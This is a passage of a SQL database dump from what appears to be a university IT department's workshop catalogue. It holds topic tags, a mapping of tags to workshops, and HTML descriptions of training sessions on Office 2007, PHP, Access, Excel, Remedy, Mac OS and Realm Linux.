(122, 'MVC'),
(123, 'fake'),
(124, 'not real'),
(125, 'PHP'),
(126, 'MySQL'),
(127, 'Graphics'),
(128, 'Images'),
(129, 'Fireworks'),
(130, 'Macromedia'),
(131, 'Web'),
(132, 'page'),
(133, 'Contribute'),
(134, 'Microsoft'),
(135, 'Office'),
(136, '2007'),
(137, 'Excel'),
(138, 'PowerPoint'),
(139, 'Access'),
(140, 'Word'),
(141, 'database'),
(142, 'Database'),
(143, 'Spreadsheet'),
(144, 'microsoft'),
(145, 'presentation'),
(146, 'remedy'),
(147, 'mac leopard apple'),
(148, '10.5'),
(149, 'macintosh'),
(150, 'GroupWise'),
(151, 'WolfWise'),
(152, 'IT Support'),
(153, 'Email'),
(154, 'Calendar'),
(155, 'OIT STAFF'),
(156, 'Computer Use'),
(157, 'Required'),
(158, 'Mandatory'),
(159, 'Realm Linux'),
(160, 'Linux'),
(161, 'Kickstart'),
(162, 'RHEL'),
(163, 'Red Hat'),
(164, 'podcasting'),
(165, 'itunes'),
(166, 'Drupal'),
(167, 'web'),
(168, 'CMS'),
(169, 'Authoring'),
(170, 'Publishing'),
(171, 'Expo'),
(172, 'Accessible'),
(173, 'Accessibility'),
(174, 'transportation'),
(175, 'cut costs'),
(176, 'alternatives'),
(177, 'Web 2.0'),
(178, 'emerging'),
(179, 'technology'),
(180, 'digital tv'),
(181, 'hdtv'),
(182, 'Active'),
(183, 'Active Directory'),
(184, 'Antivirus'),
(185, 'photography'),
(186, 'Apple'),
(187, 'T-Mobile'),
(188, 'cell phone'),
(189, 'wds windows deployment services installation configuration'),
(190, 'wds'),
(191, 'windows'),
(192, 'deployment'),
(193, 'services'),
(194, 'installation'),
(195, 'configuration'),
(196, 'ris'),
(197, 'remote'),
(198, 'Windows'),
(199, 'Adobe'),
(200, 'Photoshop'),
(201, 'Acrobat'),
(202, 'Collage'),
(203, 'Photography'),
(204, 'greeting cards'),
(205, 'indesign'),
(206, 'photoshop'),
(207, 'acrobat'),
(208, 'InDesign'),
(209, 'PhotoShop'),
(210, 'Indesign'),
(211, 'Advertisement'),
(212, 'Brochure'),
(213, 'trend micro'),
(214, 'iphone'),
(215, 'apple'),
(216, 'development'),
(217, 'Trend Micro antivirus Admin'),
(218, 'Trend Micro antivirus administration management reports'),
(219, 'virus'),
(220, 'worm'),
(221, 'conficker'),
(222, 'waledac'),
(223, 'IRCBots'),
(224, 'rootkits'),
(225, 'unreal'),
(226, 'test'),
(227, 'dummy'),
(228, 'Warner Yuen'),
(229, 'Wolfwise'),
(230, 'Groupwise'),
(231, 'Mac'),
(232, 'CTU'),
(233, 'Suppport IT Staff WolfWise Mobile Calendar Email'),
(234, 'Suppport IT Staff WolfWise Migration Oracle Calendar Email');

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_tag_map`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_tag_map` (
  `attributeName` varchar(64) NOT NULL DEFAULT '',
  `attributeId` varchar(64) NOT NULL DEFAULT '',
  `tagId` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`attributeName`,`attributeId`,`tagId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `oit_tbl_tag_map`
--

INSERT INTO `oit_tbl_tag_map` (`attributeName`, `attributeId`, `tagId`) VALUES
('workshopId', '100', 147),
('workshopId', '100', 228),
('workshopId', '102', 150),
('workshopId', '102', 151),
('workshopId', '102', 153),
('workshopId', '102', 154),
('workshopId', '102', 160),
('workshopId', '102', 229),
('workshopId', '102', 230),
('workshopId', '102', 231),
('workshopId', '103', 150),
('workshopId', '103', 151),
('workshopId', '103', 153),
('workshopId', '103', 154),
('workshopId', '103', 191),
('workshopId', '103', 198),
('workshopId', '103', 229),
('workshopId', '103', 230),
('workshopId', '104', 150),
('workshopId', '104', 151),
('workshopId', '104', 153),
('workshopId', '104', 154),
('workshopId', '104', 229),
('workshopId', '104', 230),
('workshopId', '104', 232),
('workshopId', '105', 233),
('workshopId', '106', 234),
('workshopId', '38', 118),
('workshopId', '38', 119),
('workshopId', '38', 120),
('workshopId', '39', 118),
('workshopId', '39', 119),
('workshopId', '39', 120),
('workshopId', '39', 121),
('workshopId', '39', 122),
('workshopId', '40', 123),
('workshopId', '40', 225),
('workshopId', '40', 226),
('workshopId', '40', 227),
('workshopId', '41', 127),
('workshopId', '41', 128),
('workshopId', '41', 129),
('workshopId', '41', 130),
('workshopId', '42', 130),
('workshopId', '42', 131),
('workshopId', '42', 132),
('workshopId', '42', 133),
('workshopId', '43', 134),
('workshopId', '43', 135),
('workshopId', '43', 136),
('workshopId', '43', 137),
('workshopId', '43', 138),
('workshopId', '43', 139),
('workshopId', '43', 140),
('workshopId', '44', 134),
('workshopId', '44', 135),
('workshopId', '44', 136),
('workshopId', '44', 139),
('workshopId', '44', 141),
('workshopId', '45', 134),
('workshopId', '45', 135),
('workshopId', '45', 136),
('workshopId', '45', 139),
('workshopId', '45', 141),
('workshopId', '46', 134),
('workshopId', '46', 135),
('workshopId', '46', 136),
('workshopId', '46', 139),
('workshopId', '46', 141),
('workshopId', '47', 134),
('workshopId', '47', 135),
('workshopId', '47', 136),
('workshopId', '47', 139),
('workshopId', '47', 141),
('workshopId', '47', 142),
('workshopId', '48', 134),
('workshopId', '48', 135),
('workshopId', '48', 136),
('workshopId', '48', 137),
('workshopId', '48', 143),
('workshopId', '48', 144),
('workshopId', '49', 134),
('workshopId', '49', 135),
('workshopId', '49', 136),
('workshopId', '49', 137),
('workshopId', '49', 143),
('workshopId', '49', 144),
('workshopId', '50', 134),
('workshopId', '50', 135),
('workshopId', '50', 136),
('workshopId', '50', 137),
('workshopId', '50', 143),
('workshopId', '50', 144),
('workshopId', '51', 134),
('workshopId', '51', 135),
('workshopId', '51', 136),
('workshopId', '51', 138),
('workshopId', '51', 144),
('workshopId', '51', 145),
('workshopId', '52', 146),
('workshopId', '53', 146),
('workshopId', '54', 147),
('workshopId', '54', 148),
('workshopId', '54', 149),
('workshopId', '56', 150),
('workshopId', '56', 151),
('workshopId', '56', 152),
('workshopId', '56', 153),
('workshopId', '56', 154),
('workshopId', '57', 155),
('workshopId', '57', 156),
('workshopId', '57', 157),
('workshopId', '57', 158),
('workshopId', '59', 159),
('workshopId', '59', 161),
('workshopId', '59', 162),
('workshopId', '59', 163),
('workshopId', '62', 159),
('workshopId', '62', 160),
('workshopId', '62', 161),
('workshopId', '62', 162),
('workshopId', '62', 163),
('workshopId', '64', 164),
('workshopId', '64', 165),
('workshopId', '65', 131),
('workshopId', '65', 166),
('workshopId', '65', 167),
('workshopId', '65', 168),
('workshopId', '66', 140),
('workshopId', '66', 169),
('workshopId', '66', 170),
('workshopId', '66', 171),
('workshopId', '66', 172),
('workshopId', '66', 173),
('workshopId', '68', 174),
('workshopId', '68', 175),
('workshopId', '68', 176),
('workshopId', '69', 164),
('workshopId', '69', 165),
('workshopId', '70', 177),
('workshopId', '70', 178),
('workshopId', '70', 179),
('workshopId', '71', 180),
('workshopId', '71', 181),
('workshopId', '74', 183),
('workshopId', '75', 183),
('workshopId', '76', 184),
('workshopId', '77', 185),
('workshopId', '78', 186),
('workshopId', '78', 187),
('workshopId', '78', 188),
('workshopId', '79', 134),
('workshopId', '79', 144),
('workshopId', '79', 190),
('workshopId', '79', 191),
('workshopId', '79', 192),
('workshopId', '79', 194),
('workshopId', '79', 196),
('workshopId', '79', 197),
('workshopId', '79', 198),
('workshopId', '84', 185),
('workshopId', '84', 199),
('workshopId', '84', 200),
('workshopId', '84', 201),
('workshopId', '84', 202),
('workshopId', '84', 203),
('workshopId', '84', 206),
('workshopId', '84', 207),
('workshopId', '85', 199),
('workshopId', '85', 200),
('workshopId', '85', 201),
('workshopId', '85', 204),
('workshopId', '85', 205),
('workshopId', '85', 206),
('workshopId', '85', 207),
('workshopId', '85', 208),
('workshopId', '85', 209),
('workshopId', '86', 199),
('workshopId', '86', 200),
('workshopId', '86', 201),
('workshopId', '86', 204),
('workshopId', '86', 205),
('workshopId', '86', 206),
('workshopId', '86', 207),
('workshopId', '87', 199),
('workshopId', '87', 200),
('workshopId', '87', 201),
('workshopId', '87', 205),
('workshopId', '87', 206),
('workshopId', '87', 207),
('workshopId', '87', 208),
('workshopId', '87', 209),
('workshopId', '87', 210),
('workshopId', '87', 211),
('workshopId', '88', 199),
('workshopId', '88', 200),
('workshopId', '88', 201),
('workshopId', '88', 205),
('workshopId', '88', 206),
('workshopId', '88', 207),
('workshopId', '88', 208),
('workshopId', '88', 209),
('workshopId', '88', 210),
('workshopId', '88', 211),
('workshopId', '89', 199),
('workshopId', '89', 200),
('workshopId', '89', 201),
('workshopId', '89', 205),
('workshopId', '89', 206),
('workshopId', '89', 207),
('workshopId', '89', 208),
('workshopId', '89', 209),
('workshopId', '89', 210),
('workshopId', '89', 212),
('workshopId', '90', 199),
('workshopId', '90', 200),
('workshopId', '90', 201),
('workshopId', '90', 205),
('workshopId', '90', 206),
('workshopId', '90', 207),
('workshopId', '90', 208),
('workshopId', '90', 209),
('workshopId', '90', 210),
('workshopId', '90', 212),
('workshopId', '93', 213),
('workshopId', '94', 186),
('workshopId', '94', 214),
('workshopId', '94', 215),
('workshopId', '94', 216),
('workshopId', '96', 134),
('workshopId', '96', 135),
('workshopId', '96', 136),
('workshopId', '96', 139),
('workshopId', '96', 144),
('workshopId', '97', 218),
('workshopId', '98', 219),
('workshopId', '98', 220),
('workshopId', '98', 221),
('workshopId', '98', 222),
('workshopId', '98', 223),
('workshopId', '98', 224);

-- --------------------------------------------------------

--
-- Table structure for table `oit_tbl_workshop`
--

CREATE TABLE IF NOT EXISTS `oit_tbl_workshop` (
  `workshopId` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '',
  `prerequisites` mediumtext NOT NULL,
  `status` enum('enabled','disabled') NOT NULL DEFAULT 'enabled',
  `featured` binary(1) NOT NULL DEFAULT '0',
  `description` longtext NOT NULL,
  PRIMARY KEY (`workshopId`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=108 ;

--
-- Dumping data for table `oit_tbl_workshop`
--

INSERT INTO `oit_tbl_workshop` (`workshopId`, `title`, `prerequisites`, `status`, `featured`, `description`) VALUES
(38, 'Object Oriented Principles with PHP5', 'You should probably be familiar with general PHP principles such as how to define a variable, call a function, etc.', 'enabled', '0', '<p>This application will cover the basics of Object Oriented Programming in relation to PHP5.&nbsp; PHP drastically improved their OOP model with PHP5.&nbsp; The workshop will cover basic OO principles like inheritance and polymorphism, as well as PHP5-sepcific magic methods.&nbsp; The course will be hands on, so bring your programming skillz.&nbsp;</p><p><img src="http://static.php.net/www.php.net/images/php.gif" border="0" alt="php logo" width="120" height="67" /> </p>'),
(39, 'Design Patterns with PHP5', '<p>Since we are using PHP5 as the language of choice, it would be a good idea to know <em>some</em> PHP5, but the principles go way beyond PHP and can be applied to anything.</p><p>An understanding of Object-Oriented principles is also recommended.&nbsp; It will help you follow the examples better. </p>', 'enabled', '0', '<p>So what is a design pattern?&nbsp; If you have done much programming, chances are you have used one and didn''t even know it.</p><p>&nbsp;</p><p>Design patterns are resuable solutions to common programatic problems.&nbsp; Why is this useful to you?&nbsp; Well it means that the problem you are trying to solve may have been solved by someone else, which means less code you have to write.&nbsp;</p><p>&nbsp;</p><p>This workshop will have lots of examples of design patterns, including MVC, Singleton and Factory.&nbsp; For this workshop, we will be using PHP5 as the language of choice. This will be a hands-on workshop where we will have code samples, real world problems solving, and class activities.</p>'),
(40, 'Not A Real Workshop', 'n/a', 'enabled', '0', 'This is a fictional workshop set up for testing purposes. Please do not register for this workshop.'),
(41, 'Introduction to Fireworks', '', 'enabled', '0', ''),
(42, 'Web Page Editing using Contribute', '<ol><li>Since Contribute is a web page content management tool. Students need to have an existing web site to edit. During class, students will be editing their own personal NC Sate web site. Therefore; </li><li>Students are required to complete <a href="http://www.ncsu.edu/it/essentials/web_pages/www4_setup.html" target="_blank">WWW4             Set Up Utility</a> before attending this workshop.</li><li>Participants will use their own Unity login ID and password for this class.              <ul><li>Information about your <a href="http://www.ncsu.edu/it/essentials/your_unity_account/loginid.html" target="_parent">Unity login ID and password</a>.</li><li>Verify your Unity ID/Password at <a href="http://www.ncsu.edu/password" target="_blank">www.ncsu.edu/password</a> </li><li>Assistance with your Unity login ID and password see <a href="http://help.ncsu.edu/" target="_blank">NC State Help Desk</a>, email <a href="mailto:help@ncsu.edu" target="_blank">help@ncsu.edu</a> or call 515-HELP(4357) - you''ll need your Campus ID Number. </li></ul>           </li></ol>', 'enabled', '0', '<p>Contribute is a web page content management tool that empowers business users and non-developers to make web page content updates easily and safely themselves, while still allowing the webmaster to maintain control over site design and content. There is no easier or more affordable way to keep web content current and relevant. Contribute is rapidly becoming the tool of choice for web site content management within many colleges and departments at NC State.</p><p><strong>Objectives:</strong></p><ul><li>How to connect to your web site <ul><li>administered (keyed) and non-administered sites </li></ul></li><li>Browsing to pages </li><li>Editing existing pages <ul><li>page properties </li><li>Undo </li><li>Rollback</li></ul></li><li>Publishing or Sending for review </li><li>Creating new pages <ul><li>a new (basic) web page </li><li>a new page from an existing page </li><li>a new page from a template </li></ul></li><li>Linking <ul><li>to internal pages </li><li>to external pages </li><li>to files, Word documents, PDF files and Excel spreadsheets </li></ul></li><li>Inserting objects <ul><li>images </li><li>content from Word Documents </li><li>content from Excel spreadsheets </li><li>tables</li></ul></li></ul><p>Please print the handout and bring to the workshop.</p>'),
(43, 'Using the Office 2007 Interface', 'All OIT workshops require that participants have basic computer skills and experience. The workshops are designed to enhance this foundation rather than to establish it. As a very minimum, each participant must be:         <ol><li>Familiar with the Windows operating environment. Able to perform basic Windows file management functions such as: <ul><li>Folder and file creation, deleting and renaming </li><li>File navigation </li><li>Drag and drop</li><li>Cut, Copy and Paste</li><li>Open, Save, Save-As and Close</li></ul></li></ol>', 'enabled', '1', '<p> During this session students will explore the new Office 2007 ribbon and get a hands-on overview of new features in Word. </p> <p>This workshop is the prerequisite to our Excel, PowerPoint and Access workshops. If you can not attend this this prerequisite, you should review some of the the workshop handout or the links in the Online Resources section before attending your Excel, PowerPoint or Access workshop.</p><p>Please print the office2007.doc and bring it to the workshop with you. </p><p>Following are several sites and resources that should be of help in learning more about Office 2007:</p>             <ul><li>Command Reference Guide - Wondering where your favorite Word 2003 commands are located in the new Word 2007 interface?                  <a href="http://office.microsoft.com/en-gb/word/HA100744321033.aspx?pid=CH100487431033" target="_blank">http://office.microsoft.com/en-gb/word/HA100744321033.aspx?pid=CH100487431033</a> </li><li>Word 2007 - training lessons, a series of brief, very focused lessons (about 20-30 min) -                  <a href="http://office.microsoft.com/en-gb/training/CR100654561033.aspx" target="_blank">http://office.microsoft.com/en-gb/training/CR100654561033.aspx</a> </li><li>Office 2007 Help and How-To site - at the bottom of this page, you can browse training for each of the Office 2007 products -                  <a href="http://office.microsoft.com/en-gb/training/FX100565001033.aspx" target="_blank">http://office.microsoft.com/en-gb/training/FX100565001033.aspx  </a></li><li>Demos - here are some demos of Word 2007, a different approach that may be helpful to some users. Demos are available for the other Office products as well. -                  <a href="http://office.microsoft.com/en-gb/word/CH100740901033.aspx" target="_blank">http://office.microsoft.com/en-gb/word/CH100740901033.aspx</a></li><li></li><li>Links to online training resources for Office 2007:                                 <ul><li>&lsquo;Basic Training&rsquo; is a good starting point with links to training and help sites for specific products. -                        <a href="http://office.microsoft.com/en-us/getstarted/FX101923361033.aspx" target="_blank">http://office.microsoft.com/en-us/getstarted/FX101923361033.aspx</a> </li><li>Self-paced training courses -                      <a href="http://office.microsoft.com/en-us/training/FX100565001033.aspx" target="_blank">http://office.microsoft.com/en-us/training/FX100565001033.aspx                    </a></li><li>The Microsoft Learning portal for Microsoft Office System 2007.  Many, many elearning courses! - <a href="http://www.microsoft.com/learning/office2007/default.mspx" target="_blank">http://www.microsoft.com/learning/office2007/default.mspx </a></li><li>Microsoft Office System webcasts -                     <a href="http://www.microsoft.com/events/series/officesystemwebcasts.mspx" target="_blank">http://www.microsoft.com/events/series/officesystemwebcasts.mspx</a></li></ul>               </li></ul><p>&nbsp;</p>'),
(44, 'Introduction to Access 2007 - Part 1', '<strong>Excel Part 1 and 2 or </strong><em>equivalent experience strongly recommended</em><strong>&nbsp;and familiarity with the Office 2007 interface. <a href="http://www.ncsu.edu/it/education/faculty-staff/schedule/office07.php">Using the New Office 2007 Interface</a></strong>', 'enabled', '0', '<p>This workshop will introduce you to database basics using Microsoft Access 2007 including</p>       <ul><li> Overview of MS Access</li><li>Understanding Database Objects and terminology</li><li> Using an Existing Database </li><li> Creating and Using Tables </li></ul>        <p>Since Excel and Access share terminology and concepts, registrants for this workshop should be comfortable with Excel <strong>or</strong> should have taken the Excel Part 1 and Excel Part 2 workshops offered by OIT workshops. The first half of this workshop, will serve as a overview of Access and using an existing Access database. The second half will focus on Creating and Using tables.</p>        <p>This workshop is the first of  a four-part Access series. We recommend that you register for all 4 parts.</p><p>Print the file access1.doc and bring to class. &nbsp;</p>'),
(45, 'Introduction to Access 2007 - Part 2 Queries', 'OIT Workshops: <a href="/?workshopId=44" target="_blank">Access Part 1</a>', 'enabled', '0', '<p>This workshop will cover 2 types of queries, Select Queries which allow you to extract specific information from your data and Action Queries which perform actions on the data within your database.</p><p>&nbsp;Print the access2.doc file and bring to the workshop. </p>'),
(46, 'Introduction to Access 2007 - Part 3 Forms and Reports', 'Access 2007 Part 2', 'enabled', '0', '<p>Access 2007 Part 3 will teach the basic skills for creating and editing Forms and Reports.</p><p>&nbsp;</p><p>Print the access3.doc file and bring to the workshop. </p>'),
(47, 'Introduction to Access 2007 - Part 4 Table Relationships', 'Access Part 3', 'enabled', '1', '<p>The workshop will teach how to create relationships between tables. This class includes a in-class projects that pulls in the skills learned in parts 1-3.</p><p>&nbsp;Print and bring the access4.doc file to the workshop. </p>'),
(48, 'Introduction to Excel 2007 Part 1', '<strong>Familiarity with the Office 2007 interface</strong>', 'enabled', '0', '<p>This workshop will         introduce you to the basics of Microsoft Excel 2007 Spreadsheets including</p>      <ul><li> Components of             a spreadsheet </li><li> Enter and Editing            data </li><li> Creating simple          formulas</li><li> Formating Numbers             and Text</li><li>Working with Columns           and Rows</li><li>Basics of Creating             Charts</li><li>Printing</li></ul><p>Please print only the exercises.doc (word) file for class. Thank you. </p>'),
(49, 'Introduction to Excel 2007 Part 2', 'Excel Part 1 or equivilant experience and familiarity with the Office 2007.', 'enabled', '0', '<p>As a continuance of Introduction to Excel 1, this workshop covers additional         basic Excel features with a focus on text instead of numerical          data. </p>        <p>Do you keep a list of names, addresses and/or other        text data?          In addition         to          Excel''s        calculation features, it is also a convenient tool for managing and         organizing a data. </p>       <p>This workshop will expose you to a few entry level features in Excel           that        will assist you in managing your database as well as in working         with large amounts of data.</p>       <p> Topics covered include:</p>         <ul><li>Working with large             worksheets</li><li>Multiple worksheets</li><li>Headers and Footers</li><li>Password protection</li><li>Finding, Sorting          and Filtering</li></ul><div>Print the Introduction to excel2handout.doc file and bring to class.</div>'),
(50, 'Introduction to Excel 2007 Part 3', 'Excel Part 2 or equivilant experience and familiarity with the Office 2007 interface.', 'enabled', '0', '<p><font color="#000000">Do you keep a list of names, addresses and/or other text data? In addition to Excel''s calculation features, it is also a convenient tool for managing and organizing a data. </font></p><p><font color="#000000">This workshop will expose you to a few Intermediate level features in Excel that will assist you in managing your database as well as in working with large amounts of data.</font> </p><p>Topics covered include:</p><ul><li>Diving a Column </li><li>Writing conditional IF formulas </li><li>Understanding Absolute and Relative cell references </li><li>Recording Macros </li><li>Creating Drop Down lists in a cell </li><li>more topics as time allows </li></ul><p>Please print the excel3handout.doc.</p>'),
(51, 'Presentations with PowerPoint 2007', '<strong> Familiarity with the <a href="/?workshopId=43">Office 2007 interface</a>.</strong>', 'enabled', '0', '<p>An introduction to Microsoft Presentation design program. Learn how             to apply a design and layout to slides, add and modify content, include             animation and slide transitions as well as print or convert your presentation               to the web. </p>          <p><font face="Arial, Helvetica, sans-serif" size="2"><strong>Learning objectives</strong></font> </p>          <ul><li><font face="Arial, Helvetica, sans-serif" size="2">Create a presentation                 from scratch</font></li><li><font face="Arial, Helvetica, sans-serif" size="2">Select slide layouts                and design templates</font></li><li><font face="Arial, Helvetica, sans-serif" size="2">Insert clip art</font></li><li><font face="Arial, Helvetica, sans-serif" size="2">Format and run                 a slide show</font></li></ul>'),
(52, 'Using Remedy AR User at NC State', 'Must have a Remedy account created for you before you attend this         workshop.', 'enabled', '0', '<p>The Remedy AR User            call tracking system is used by various support organizations across            campus to log, track, and resolve issues within and between their departments.              Remedy is also the &quot;back-end&quot; of the Computing Services<a href="http://help.ncsu.edu/"> Help                database</a>, where users can go to get solutions for computing issues            they may be having. </p>          <p>The first of two               Remedy training sessions, Using Remedy AR User at NC State takes a              beginning user through how to access Remedy, modify User settings,              and log and retrieve calls from within workgroups.</p>            <p>If you have never              used Remedy before, please verify that you have a Remedy account already            created for you, so we do not have to do this during class time. Also,              if your organization is not yet a part of the Remedy implementation             at NC State, this course is not the opportunity to learn more about             Remedy. We can provide more insight into Remedy with a personal visit               with your organization. After your group is made a part of Remedy,              then attending the courses will be of more use to you. It is possible               to schedule private training sessions for departments outside of the            listed schedule. These sessions can be in our training facility or              at another location. For more information, please contact us at <a href="mailto:remedy@ncsu.edu">remedy@ncsu.edu </a></p>             <p>&nbsp;</p>'),
(53, 'Advanced Remedy Topics', '', 'enabled', '0', ''),
(54, 'Overview of Macintosh OS 10.5', 'None.', 'enabled', '0', '<p><span class="Apple-style-span" style="background-color: #ccffcc">Will provide an overview of the Macintosh operating system using the latest version 10.5 (Leopard). &nbsp;Emphasis will be on basic features, common problems, and self-help for troubleshooting. &nbsp;A synopsis of Macintosh OS 10.5 Server will also be given. &nbsp;A 30 minute question and answer session will be held at the end of class so please bring real world issues you might be having for discussion.</span></p><p><span class="Apple-style-span" style="font-weight: bold"><span class="Apple-style-span" style="background-color: #ff0000">Note:</span></span></p><p><span class="Apple-style-span" style="background-color: #ccffcc">Participants of this workshop do not need to print a handout to bring to the training session. </span></p>'),
(55, 'MSI Application Packaging', 'Working knowledge of application packaging on Windows. Previous experience with Installshield AdminStudio and MSI''s.', 'enabled', '0', '<p>This class will covering the advanced topics regarding the creation and distribution of Microsoft Installers.</p><ul><li>Direct Editting of the MSI Database using Orca</li><li>Custom Actions</li><li>Best Practices in Creating MSI''s w/ AdminStudio</li><li>Better Snapshotting</li><li>Group Policy Object Creation</li><li>Packaging for Different Environments</li></ul><p>Note:</p><p>Handout will be coming soon...It is not required for the handout to be printed out for class.&nbsp;</p>'),
(56, 'Hands-On WolfWise Orientation for IT Support Staff', 'There are no pre-requisites for this workshop.', 'disabled', '0', '<p>Come get a hands-on orientation to our new implementation of GroupWise, called Woifwise. See what it looks like and how it works. </p><p>This workshop will:</p><ul><li> explore general email and calendar features&nbsp;</li><li>highlight differences from Oracle Calendar</li><li>offer a Question and Answer session</li></ul><p>This session is intended for Oracle node managers and any other IT staff that are currently supporting Oracle calendar.</p><p>If you need a GW account, please send a note to Sarah Noell (sarah@ncsu.edu) by Wednesday, 7/20 and we''ll see that one gets created for you. Please keep in mind that currently we are only creating GW accounts for IT technical staff to help familiarize them with the system. We do not plan to provision general user GW accounts until the migration occurs sometime in October. </p><p>&nbsp;</p>'),
(57, 'OIT Computer Use Regulation and Copyright Responsibilities Training', 'none', 'disabled', '0', '<p>As a result of a recent computer security incident all OIT staff members  will need to attend a review of NC State''s Computer Use Policies. We  will be conducting three classes the second week of August and  attendance in one of these sessions is mandatory for all OIT staff. The  sessions will cover: </p><strong>Regulatory Limitations  </strong><ul><li>User Accounts&nbsp;&nbsp;  </li><li>Guest Accounts </li><li>Federal &amp; State Laws </li><li>State Policies </li><li>Email / Network Data&nbsp;&nbsp;  </li><li>Confidential Passwords </li><li>Work-Related Access to Business Information </li><li>Limits on Access &amp; Storage </li><li>Sender Identification&nbsp;&nbsp;  </li><li>Computer Registration</li></ul><p><strong>Personal Use&nbsp;</strong></p><ul><li>Limits of Personal Use for Authorized Users</li></ul><strong>File Sharing&nbsp;&nbsp;</strong>  <ul><li>What is file sharing? </li><li>What are some popular file sharing applications? </li><li>Are there legal uses of file sharing applications? What are they?&nbsp;&nbsp;  </li><li>What happens if I&rsquo;m caught doing illegal file sharing at work? </li><li>Why is file sharing potentially unsafe? </li></ul><strong>Use of Computing Facilities for Commercial, Advertising, and Broadcast Purposes</strong><ul><li>Paid Advertising </li><li>User Advertising / Broadcast Emails </li><li>University Trademarks</li></ul><strong>Violation of Policy&nbsp;&nbsp;  </strong><ul><li>Employees&nbsp;&nbsp;  </li><li>Students </li><li>Sanctions </li></ul><p><strong>Application of Public Records Law</strong></p><p><strong>Additional Rules</strong></p>'),
(58, 'I can''t attend the required OIT Staff Training', '', 'disabled', '0', '<p>This &quot;class&quot; has been created to collect the names and contact information of OIT staff who can not attend the OIT Staff Computer Use workshop during its scheduled times.&nbsp; </p><p>Any date assigned to this workshop <strong>does NOT </strong>represent a true alternative date and time. Those who register here will be contacted to prepare alternative arrangements. </p>'),
(59, 'Basic Introduction to Administrating and Deploying Realm Linux', '', 'enabled', '0', 'The <span>Basic Introduction to Administrating and Deploying Realm Linux</span> class will cover topics to prepare you to maintain and deploy basic linux labs as well as stand alone workstations. &nbsp; Topics include:<div id="description"><ul><li>Required kickstart configuration </li><li>Setting up users that can sudo </li><li>Setting the default printer</li><li>Registering with RHN for updates  </li><li>Best Practices</li></ul></div><div id="description">If you are new to NCSU or have never deployed the Realm kit this is the class you may want to start with. It also provides the basic frame work that you will expand upon in the Advance class to deploy more complex systems&nbsp; </div><div id="description">&nbsp;</div>'),
(60, 'e-Procurement Demo and Discussion', 'Must be OIT Staff.', 'enabled', '0', '<p><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''"></span></p><p><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''"></span></p><p><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">Presenter:&nbsp; Tom Reynolds</span></p><p><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''"></span><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">Unit:&nbsp; EAS, Financial Application Development Team</span></p><p><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">Audience: OIT Staff Only</span></p><p><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">Actual start time: 12:15 p.m.&nbsp;&nbsp; End time:&nbsp; 12:45 p.m.</span></p><p><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">NC State implemented an e-Procurement module within the Financial System in February 2008 called the NCSU MarketPlace.&nbsp; Come attend a demo of this system to see how this system is used to shop on a vendor''s site, bring the order back to the Financial system, route through approvals, and then electronically transmit the order to the vendor.&nbsp; The list of vendors includes Staples, Office Depot, MyOfficeProducts, Storr, Apple, Dell, CDW, GovConnection, Grainger, Fisher, Sigma-Aldrich, VWR, and new vendors are being added all the time.&nbsp; Attend this session if you want an informal and quick demonstration to see how OIT folks have integrated with external vendors to help campus customers purchase ''stuff''.</span></p>'),
(61, 'So what does ''Year-End'' really mean?', 'Must be OIT staff!', 'enabled', '0', '<p style="margin: 0in 0in 12pt; line-height: normal" class="MsoNormal"><span style="font-size: 12pt; font-family: ''Times New Roman'',''serif''"></span></p><p style="margin: 0in 0in 12pt; line-height: normal" class="MsoNormal"><span style="font-size: 12pt; font-family: ''Times New Roman'',''serif''"><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''"></span></span></p><p style="margin: 0in 0in 12pt; line-height: normal" class="MsoNormal"><span style="font-size: 12pt; font-family: ''Times New Roman'',''serif''"><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">Presenter:&nbsp; Heidi Kozlowski</span></span></p><p style="margin: 0in 0in 12pt; line-height: normal" class="MsoNormal"><span style="font-size: 12pt; font-family: ''Times New Roman'',''serif''"><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''"></span></span><span style="font-size: 12pt; font-family: ''Times New Roman'',''serif''"><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">Unit:&nbsp; University Controllers'' Office (sponsored by the EAS, Financial Application Development Team)</span></span></p><p style="margin: 0in 0in 12pt; line-height: normal" class="MsoNormal"><span style="font-size: 12pt; font-family: ''Times New Roman'',''serif''"><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''"></span></span><span style="font-size: 12pt; font-family: ''Times New Roman'',''serif''"><span style="font-size: 12pt; line-height: 115%; font-family: ''Times New Roman'',''serif''">Actual Start time: 12:15 p.m.&nbsp;&nbsp; End time: 12:45 p.m.</span></span></p><p style="margin: 0in 0in 12pt; line-height: normal" class="MsoNormal"><span style="font-size: 12pt; font-family: ''Times New Roman'',''serif''">Ever heard the term ''Year-End'' and wonder what it means?&nbsp; Have you ever tried to do maintenance or an upgrade in July or August and been told that it needs to be scheduled after ''Year-End''?&nbsp; Come and meet Heidi Kozlowski from the University Controller''s Office for an informal discussion on what Year-End means to the folks responsible for making it happen.</span></p>'),
(62, 'Advanced Realm Linux Administration and Deployment', 'Familiarity with Realm Linux or basic Linux systems administration.', 'enabled', '0', '<p>The Advanced Realm Linux Administration and Deployment class will cover topics to prepare you to maintain complex workstation setups, setup individual servers and server pools, automate administration tasks, and use disaster recovery techniques.&nbsp; Topics include:</p><ul><li>Advanced Web-Kickstart Configurations</li><li>Using RAID and LVM</li><li>Case Study: An Apache Web Server</li><li>Running Scripts&nbsp;</li><li>Best Practices</li></ul>'),
